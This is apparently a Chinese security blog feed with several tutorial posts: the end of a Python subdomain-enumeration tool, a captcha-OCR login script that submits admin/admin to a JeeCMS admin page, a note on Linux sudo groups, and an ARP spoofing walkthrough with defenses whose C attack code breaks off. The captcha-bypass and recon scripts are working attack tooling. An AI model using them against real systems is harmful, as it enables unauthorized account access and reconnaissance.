result[rdtype].append(item.address)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        result[rdtype] = [item.address]</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_domain</span><span class="params">(self, domain)</span>:</span></span><br><span class="line">        domain_regex = re.compile(</span><br><span class="line">            <span class="string">r'(?:[A-Z0-9_](?:[A-Z0-9-_]&#123;0,247&#125;[A-Z0-9])?\.)+(?:[A-Z]&#123;2,6&#125;|[A-Z0-9-]&#123;2,&#125;(?&lt;!-))\Z'</span>, </span><br><span class="line">            re.IGNORECASE)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span> <span class="keyword">if</span> domain_regex.match(domain) <span class="keyword">else</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_type_name</span><span class="params">(self, typeid)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> dns.rdatatype.to_text(typeid)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_type_id</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> dns.rdatatype.from_text(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 域名枚举类(域名解析的入口)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DomainFuzzer</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,target,dict_file=<span class="string">'top200_domain.txt'</span>)</span>:</span></span><br><span class="line">        self.target = target</span><br><span class="line">        self.dict = list(set(FileUtils.getLines(dict_file)))</span><br><span class="line">        self.resolver = Domain(NAMESERVERS,timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多线程枚举 入口</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,thread_cnt=<span class="number">16</span>)</span>:</span></span><br><span class="line">        <span class="comment"># 所有子域名队列,check后存在的域名和IP字典</span></span><br><span class="line">        all_queue,ok_queue = Queue.Queue(),Queue.Queue()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> self.dict:</span><br><span class="line">            all_queue.put(<span class="string">'.'</span>.join([str(line),str(self.target)]))</span><br><span class="line">        </span><br><span class="line">        e_ips,threads = self.resolver.extensive(self.target),[]</span><br><span class="line">        <span class="comment"># print '-- extensive',e_ips</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(thread_cnt):</span><br><span class="line">            threads.append(self.bruteWorker(self.resolver,all_queue,ok_queue,e_ips))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads: t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads: t.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> ok_queue.empty():</span><br><span class="line">            <span class="keyword">yield</span> ok_queue.get()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单线程枚举入口</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">bruteWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,resolver,all_queue,ok_queue,extensive=[])</span>:</span></span><br><span class="line">            threading.Thread.__init__(self)</span><br><span class="line">            self.all_queue = all_queue</span><br><span class="line">            self.resolver = resolver</span><br><span class="line">            self.ok_queue = ok_queue</span><br><span class="line">            self.extensive = extensive</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">while</span> <span class="keyword">not</span> self.all_queue.empty():</span><br><span class="line">                    sub = self.all_queue.get_nowait()</span><br><span class="line">                    <span class="comment"># print '-- sub: ',sub</span></span><br><span class="line"></span><br><span class="line">                    record = self.resolver.query(sub,<span class="string">'A'</span>)</span><br><span class="line">                    <span class="keyword">if</span> record:</span><br><span class="line">                        ips = record[<span class="string">'A'</span>]</span><br><span class="line">                        <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">                            <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> self.extensive:</span><br><span class="line">                                self.ok_queue.put(sub)</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">return</span> self.ok_queue</span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 好搜搜索引擎接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaosouAPI</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    api = <span class="string">'http://www.haosou.com/s?src=360sou_newhome&amp;q=site:'</span></span><br><span class="line">    <span class="comment"># 好搜搜索引擎的入口</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,target)</span>:</span></span><br><span class="line">        self.target = target</span><br><span class="line">        self.ptn = self.get_ptn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_ptn</span><span class="params">(self)</span>:</span></span><br><span class="line">        tmp = self.target.replace(<span class="string">'.'</span>,<span class="string">'\.'</span>)</span><br><span class="line">        <span class="keyword">return</span> re.compile(<span class="string">'linkinfo\"\&gt;\&lt;cite\&gt;(.+?\.'</span>+tmp+<span class="string">')'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,page_cnt=<span class="number">50</span>)</span>:</span></span><br><span class="line">        subs = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,page_cnt):</span><br><span class="line">            url = self.api+self.target+<span class="string">'&amp;pn='</span>+str(x)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rsp = requests.get(url)</span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                logging.info(str(e))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            html = rsp.text</span><br><span class="line">            items = re.findall(self.ptn,html)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> items:</span><br><span class="line">                subs.append(i)</span><br><span class="line">        <span class="keyword">return</span> set(subs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># i.links.cn 子域名查询接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ILinksAPI</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    api = <span class="string">'http://i.links.cn/subdomain/'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, </span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://i.links.cn/subdomain/"</span>,</span><br><span class="line">        <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.87 Safari/537.36"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,target)</span>:</span></span><br><span class="line">        self.target = target</span><br><span class="line">        self.ptn = self.get_ptn()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_ptn</span><span class="params">(self)</span>:</span></span><br><span class="line">        tmp = self.target.replace(<span class="string">'.'</span>,<span class="string">'\.'</span>)</span><br><span class="line">        <span class="keyword">return</span> re.compile(<span class="string">'https?://([\w\-\.]*?'</span>+tmp+<span class="string">')'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        subs = set()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'domain'</span>:self.target,</span><br><span class="line">            <span class="string">'b2'</span>:<span class="number">1</span>,</span><br><span class="line">            <span class="string">"b3"</span>:<span class="number">1</span>,</span><br><span class="line">            <span class="string">"b4"</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rsp = requests.post(self.api,headers=self.headers,data=data)</span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line">            logging.info(str(e))</span><br><span class="line">            <span class="keyword">return</span> subs</span><br><span class="line">        html = rsp.text</span><br><span class="line">        items = re.findall(self.ptn,html)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> items:</span><br><span class="line">            subs.add(i)</span><br><span class="line">        <span class="keyword">return</span> subs</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(args)</span>:</span></span><br><span class="line">    domain = args.domain</span><br><span class="line">    thread_cnt = int(args.thread)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> domain:</span><br><span class="line">        print(<span class="string">'usage: domain_seeker.py -d aliyun.com -a'</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    res_subs = set()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 API</span></span><br><span class="line">    <span class="keyword">if</span> args.api:</span><br><span class="line">        iapi = ILinksAPI(domain)</span><br><span class="line">        subs = iapi.run()</span><br><span class="line">        logging.info(<span class="string">'API Module success with '</span>+str(len(subs)))</span><br><span class="line">        res_subs = res_subs.union(subs)  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用搜索引擎</span></span><br><span class="line">    <span class="keyword">if</span> args.search:</span><br><span class="line">        ha = HaosouAPI(domain)</span><br><span class="line">        subs = ha.run()</span><br><span class="line">        logging.info(<span class="string">'Search Engine Module success with '</span>+str(len(subs)))</span><br><span class="line">        res_subs = res_subs.union(subs)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 dns 枚举</span></span><br><span class="line">    <span class="keyword">if</span> args.bruteforce:</span><br><span class="line">        <span class="comment"># logging.info("Fuck")</span></span><br><span class="line">        df = DomainFuzzer(domain)</span><br><span class="line">        <span class="comment"># 爆破得到的域名列表</span></span><br><span class="line">        subs = set()</span><br><span class="line">        <span class="keyword">for</span> sub <span class="keyword">in</span> df.run(thread_cnt):</span><br><span class="line">            subs.add(sub)</span><br><span class="line">        logging.info(<span class="string">'Bruteforce Module success with '</span>+str(len(subs)))</span><br><span class="line">        res_subs = res_subs.union(subs)</span><br><span class="line"></span><br><span class="line">    logging.info(<span class="string">'End success with '</span>+str(len(res_subs)))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> res_subs:</span><br><span class="line">        <span class="keyword">print</span> x</span><br><span class="line">    <span class="keyword">return</span> res_subs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">"Multi-method SubDomain Seeker"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-t"</span>,<span class="string">"--thread"</span>,metavar=<span class="string">'NUM'</span>,default=<span class="number">100</span>,help=<span class="string">"thread count"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-d"</span>,<span class="string">"--domain"</span>,metavar=<span class="string">'DOMAIN'</span>,help=<span class="string">"target doamin"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-b"</span>,<span class="string">"--bruteforce"</span>,help=<span class="string">"dns bruteforce"</span>,action=<span class="string">'store_true'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-s"</span>,<span class="string">"--search"</span>,help=<span class="string">"search engine"</span>,action=<span class="string">'store_true'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-a"</span>,<span class="string">"--api"</span>,help=<span class="string">"domain finder api"</span>,action=<span class="string">'store_true'</span>)    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        run(args)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        logging.info(<span class="string">"Ctrl C - Human Stop"</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>GitHub源码： <a href="https://github.com/Evi1CLAY/CoolPool" target="_blank" rel="external">https://github.com/Evi1CLAY/CoolPool</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://github.com/ring04h/wydomain" target="_blank" rel="external">https://github.com/ring04h/wydomain</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参照猪猪侠的 wydomain 项目写一个简单的二级域名查找的脚本，提供三种方式来收集目标的子域名信息。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DNS枚
    
    </summary>
    
    
      <category term="二级域名查找" scheme="http://www.evilclay.com/tags/%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D%E6%9F%A5%E6%89%BE/"/>
    
      <category term="DNS枚举" scheme="http://www.evilclay.com/tags/DNS%E6%9E%9A%E4%B8%BE/"/>
    
  </entry>
  
  <entry>
    <title>识别验证码账户暴力破解小记</title>
    <link href="http://www.evilclay.com/2016/12/18/%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81%E8%B4%A6%E6%88%B7%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B0%8F%E8%AE%B0/"/>
    <id>http://www.evilclay.com/2016/12/18/识别验证码账户暴力破解小记/</id>
    <published>2016-12-17T16:21:10.000Z</published>
    <updated>2016-12-17T16:46:58.959Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先能使用工具重放用户的请求，然后再考虑表单暴力破解。先分析下正常登录通讯流程：</p>
<ol>
<li>用户访问 login 页面  —-&gt;   服务器返回 响应，在头部设置 cookie</li>
<li>用户带着得到的 cookie 去请求验证码图片 —-&gt; 服务器返回验证码图片</li>
<li>用户带着cookie 去 post 登录表单     —-&gt; 服务器根据cookie选定该用户服务器端的验证码与客户端传来的作对比，成功比对其它登录信息</li>
</ol>
<p>由于对验证码功能开发这块不了解，导致初步分析的时候重放POST请求忘记带cookie服务器一直返回内部错误，真是羞涩，好在后面一点点 fuzz 的时候把问题找出来了，所以才有了上面的3个通讯步骤。</p>
<p>在这个实验中，首先要把 <strong>图片验证码识别</strong> 成字符串，然后 <strong>维持cookie</strong> 请求发送 POST 包就可以了，原理很清新。所以能否成功利用很大程度取决于服务器是否使用了足够“操蛋”的验证码，所以说并不是用了验证码，就可以避免口令爆破了。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>需要安装下面的第三方库</p>
<pre><code>sudo apt-get install tesseract-ocr  //  Google的开源验证码识别程序
pip install  pytesseract   // tesseract-ocr 的 py 接口
pip install  Image    // 图片处理库
import requests    //  网络请求库
</code></pre><p>在这里顺带说一句，默认可以识别英文字符，如识别中文的话需要自行搜索下载 tesseract-ocr 的中文语言包放在指定目录里。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># Author: Anka9080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"></span><br><span class="line"><span class="comment"># fuck captcha auto login script</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">	<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.87 Safari/537.36'</span>,</span><br><span class="line">	<span class="string">'Referer'</span>:<span class="string">'http://foo.com/jeeadmin/jeecms/login.do'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">FuckCaptchaLogin</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.login_url = <span class="string">'http://foo.com/jeeadmin/jeecms/login.do'</span></span><br><span class="line">		self.captcha_url = <span class="string">'http://foo.com/captcha.svl'</span></span><br><span class="line">		self.image_name = <span class="string">'captcha.jpeg'</span></span><br><span class="line">		self.login()</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">download_image</span><span class="params">(self,s)</span>:</span></span><br><span class="line">		r = s.get(url=self.captcha_url,headers=HEADERS)</span><br><span class="line">		<span class="keyword">with</span> open(self.image_name,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">			<span class="keyword">for</span>  chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">1024</span>):</span><br><span class="line">				f.write(chunk)</span><br><span class="line">				f.flush()</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span>  <span class="title">orc_image</span><span class="params">(self)</span>:</span></span><br><span class="line">		im =  Image.open(self.image_name)</span><br><span class="line">		captcha_string = pytesseract.image_to_string(im, lang=<span class="string">'eng'</span>).strip()</span><br><span class="line">		<span class="keyword">return</span>  captcha_string</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">		s = requests.Session()</span><br><span class="line">		r = s.get(url = self.login_url,headers=HEADERS)</span><br><span class="line">		r = s.get(url=self.login_url,headers=HEADERS)</span><br><span class="line">		<span class="keyword">print</span> r.request.headers</span><br><span class="line">		self.download_image(s)</span><br><span class="line">		captcha_string = self.orc_image()</span><br><span class="line">		post_data = &#123;</span><br><span class="line">			<span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line">			<span class="string">'password'</span>:<span class="string">'admin'</span>,</span><br><span class="line">			<span class="string">'captcha'</span>:captcha_string,</span><br><span class="line">			<span class="string">'submit.x'</span>:<span class="string">'20'</span>,</span><br><span class="line">			<span class="string">'submit.y'</span>:<span class="string">'20'</span>,</span><br><span class="line">		&#125;</span><br><span class="line">		r = s.post(url=<span class="string">'http://foo.com/jeeadmin/jeecms/login.do'</span>,headers=HEADERS,data=post_data)</span><br><span class="line">		<span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	FuckCaptchaLogin()</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;首先能使用工具重放用户的请求，然后再考虑表单暴力破解。先分析下正常登录通讯流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户访问 login 页面  —
    
    </summary>
    
    
      <category term="验证码识别" scheme="http://www.evilclay.com/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/"/>
    
      <category term="暴力破解" scheme="http://www.evilclay.com/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>Linux的sudo权限分析小记</title>
    <link href="http://www.evilclay.com/2016/11/06/Linux%E7%9A%84sudo%E6%9D%83%E9%99%90%E5%88%86%E6%9E%90%E5%B0%8F%E8%AE%B0/"/>
    <id>http://www.evilclay.com/2016/11/06/Linux的sudo权限分析小记/</id>
    <published>2016-11-06T04:07:05.000Z</published>
    <updated>2016-11-06T04:07:51.574Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><pre><code>所谓 sudo ，就是 &quot;superuser do&quot;,即让普通用户以 root 权限执行命令。
</code></pre><h2 id="添加-sudo-权限"><a href="#添加-sudo-权限" class="headerlink" title="添加 sudo 权限"></a>添加 sudo 权限</h2><p>给已经存在的用户添加 sudo 权限一般有两种方式：</p>
<pre><code>1. 直接修改 /etc/sudoer 文件
2. 使用命令把用户添加到sudo组
</code></pre><p>不管是方式1 还是 方式2 最终都可以在 sudo 的配置文件 /etc/sudoer 中看出原因，正所谓”一切皆文件”。</p>
<p>直接修改 /etc/sudoer 文件</p>
<pre><code>sudo vi /etc/sudoers
// 追加如下格式字符串
username    ALL=(ALL:ALL) ALL
//  这是把某一用户赋予 sudo 权限，若需要对整个用户组赋予 sudo 权限需要用关键字 %作为标志
%groupname    ALL=(ALL:ALL) ALL
</code></pre><p>使用命令把用户添加到sudo组</p>
<pre><code>sudo adduser anka1 sudo
// 或者
sudo usermod -a -G sudo anka1
</code></pre><p>这种方式虽然没有直接修改 /etc/sudoers 文件，却把 username 用户追加到sudo组中，在sudo组中的用户本身就有 sudo 权限，可以从配置文件中看出</p>
<pre><code>sudo vi /etc/sudoers
//  默认有如下一行
%sudo   ALL=(ALL:ALL) ALL
</code></pre><p>使用命令查看 sudo 组中的成员有哪些：</p>
<pre><code>anka9080@evilclay:/home$ getent group sudo
sudo:x:27:anka9080,anka1
//  除了默认的用户 anka9080 ， anka1 也已经被添加到 sudo 组中了。
</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以新建一个sudo权限的用户的脚本如下：</p>
<pre><code>sudo useradd ankauser
sudo echo &quot;ankauser:ankapass&quot; | sudo chpasswd
sudo adduser ankauser sudo
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;所谓 sudo ，就是 &amp;quot;superuser do&amp;quot;,即让普通用户以 root 权限执行命令。
&lt;/co
    
    </summary>
    
    
      <category term="sudo" scheme="http://www.evilclay.com/tags/sudo/"/>
    
  </entry>
  
  <entry>
    <title>ARP协议分析与漏洞利用</title>
    <link href="http://www.evilclay.com/2016/10/28/ARP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/</id>
    <published>2016-10-27T16:28:12.000Z</published>
    <updated>2016-10-27T16:58:01.850Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD</p>
</blockquote>
<h2 id="ARP-协议是什么"><a href="#ARP-协议是什么" class="headerlink" title="ARP 协议是什么"></a>ARP 协议是什么</h2><p>局域网通信中需要知道目标主机的MAC地址才能与其建立连接。</p>
<p>ARP是地址解析协议，根据目标主机的IP地址获取其MAC地址。</p>
<h2 id="ARP-工作流程"><a href="#ARP-工作流程" class="headerlink" title="ARP 工作流程"></a>ARP 工作流程</h2><p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage1.png" alt="ARP工作流程"></p>
<p>如图所示局域网双方通信时：</p>
<p>首先检测ARP缓存表，缓存表没有目标IP-MAC映射时需要先向全网发送目的IP为192.168.1.xxx </p>
<p>目的MAC为FF-FF-FF-FF-FF-FF的全网广播，当局域网中IP为192.168.1.xxx的主机收到请求时，</p>
<p>发送一个包含自己IP-MAC的响应包给请求主机，请求主机收到响应包，解析出IP对应的MAC，写入自己的ARP缓存表。</p>
<p>继而，双方可以建立正常的通信。</p>
<p>以上是建立的是动态ARP映射条目，每项条目有预定的生存时间。</p>
<blockquote>
<p>Windows系统ARP表项生存时间2min。<br>Linux系统ARP表项生存时间30s。</p>
</blockquote>
<p>可以看出ARP缓存表是双方通信的基础，这个ARP缓存表是否是可以“手动”修改的？  当然可以。 </p>
<p>在系统CMD下，有ARP配置命令：</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage2.png" alt="ARP命令"></p>
<p>可以直接管理的当前系统的ARP缓存表。</p>
<h2 id="ARP协议的漏洞"><a href="#ARP协议的漏洞" class="headerlink" title="ARP协议的漏洞"></a>ARP协议的漏洞</h2><p>主机在更新ARP缓存表时并不检测收到的ARP响应包的正确性，直接根据响应包的信息对缓存表进行更新。</p>
<p>无论之前是否发过ARP请求，再收到ARP响应包后都会对ARP缓存表进行更新。</p>
<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>I． 攻击机构造虚假ARP响应包 发送给 目标主机。</p>
<p>II．目标主机更新本地ARP缓存表</p>
<p>III．目标主机的通信收到影响（断网，MIT攻击）。</p>
<h2 id="攻击Demo"><a href="#攻击Demo" class="headerlink" title="攻击Demo"></a>攻击Demo</h2><p>1、 攻击前目标主机能够正常上网</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage3.png" alt=""></p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage4.png" alt=""></p>
<p>2、 运行攻击程序 对 目标主机进行ARP 欺骗攻击<br>主要是构造四个参数：源IP，MAC，目标IP，MAC</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage5.png" alt="run_arp_attack"></p>
<ol>
<li>Wireshark 抓数据包</li>
</ol>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage6.png" alt="wire"></p>
<p>数据包的详细内容</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage7.png" alt="packet"></p>
<ol>
<li>攻击效果</li>
</ol>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage8.png" alt="attack_res"></p>
<p>请求网关测试</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage9.png" alt="req_gateway"></p>
<p>请求百度网站测试</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage10.png" alt="req_baidu"></p>
<h2 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h2><p>静态添加ARP缓存表条目，避免ARP条目的恶意被动更新。</p>
<pre><code>CMD下：arp -s 目标IP 目标MAC
</code></pre><p>Win8/10下，该命令权限不够，用之下方法绑定</p>
<pre><code>netsh i i show in
netsh -c i i add neighbors 4 192.168.1.1 0c-72-2c-25-ca-66
// 4为 第一条命令回显的本地连接网卡Idx号
</code></pre><p>结果如图：</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/arpimage11.png" alt="def_res"></p>
<h2 id="攻击程序代码-C语言"><a href="#攻击程序代码-C语言" class="headerlink" title="攻击程序代码(C语言)"></a>攻击程序代码(C语言)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 